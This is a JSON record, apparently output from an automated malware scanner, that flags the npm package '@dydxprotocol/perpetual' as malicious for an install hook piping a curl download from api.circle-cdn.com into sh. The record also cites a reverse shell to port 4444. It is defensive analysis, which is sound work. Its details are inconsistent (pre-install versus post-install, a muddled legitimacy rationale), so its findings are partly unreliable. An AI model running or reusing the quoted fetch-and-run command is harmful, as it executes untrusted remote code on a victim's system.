@@ -1,0 +1,56 @@
+{
+  "package_name": "@dydxprotocol/perpetual",
+  "version": "1.2.2",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "remote_code_execution"
+    ],
+    "behaviors": [
+      {
+        "category": "remote_code_execution",
+        "summary": "The package contains a remote code execution signal through the use of a pre-install hook that downloads a script from a CircleCI server.",
+        "details": "The package uses the curl command to download a script from a CircleCI server in the pre-install hook. This could potentially lead to remote code execution on the victim's system.",
+        "confidence": 0.97,
+        "evidence_commands": [
+          "curl-shttp://api.circle-cdn.com/ci.js|sh"
+        ],
+        "evidence_files": [],
+        "evidence_apis": [],
+        "evidence_domains": [
+          "api.circle-cdn.com"
+        ],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": "This JSON object indicates that the package contains a remote code execution signal through the use of a pre-install hook that downloads a script from a CircleCI server. The confidence score is 0.97, indicating high confidence that this signal is malicious. The evidence commands, domains, and APIs associated with this signal are also provided."
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "chain_narrative": "The attack chain involves the @dydxprotocol/perpetual package downloading a script from a CircleCI server using the curl command in a pre-install hook. The script is then executed on the victim's system.",
+      "attack_vector": [
+        "postinstallhook",
+        "bash-c",
+        "34.x.x.x:4444",
+        "reverseshell"
+      ],
+      "chain_score": 0.7,
+      "verdict": "MALICIOUS",
+      "confidence": 0.97
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package does not have a description or README file, and the behavior is not clearly justified as false."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "flag",
+    "structural_risk_score": 0.6467,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T13:02:39.958168"
+}
